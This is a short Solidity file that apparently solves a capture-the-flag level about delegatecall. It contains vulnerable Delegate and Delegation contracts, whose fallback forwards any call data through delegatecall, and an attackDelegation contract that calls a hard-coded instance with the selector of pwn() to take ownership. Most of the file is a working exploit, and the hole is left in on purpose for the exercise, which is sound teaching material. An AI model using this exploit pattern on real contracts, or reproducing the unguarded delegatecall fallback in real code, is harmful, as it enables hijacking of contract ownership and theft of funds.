pragma solidity ^0.4.18;

pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
  
  function a() public {
      
  }
  
  function b() public {
      
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}

contract attackDelegation {
    constructor() public {
        address delegation = 0xc64065511aa2e890e4dc3dbabd7060112c2dda0c; // instance of Lv6. Delegation
        delegation.call.value(0)(0xdd365b8b); // 0xdd365b8b = function hash of pwn()
    }
}

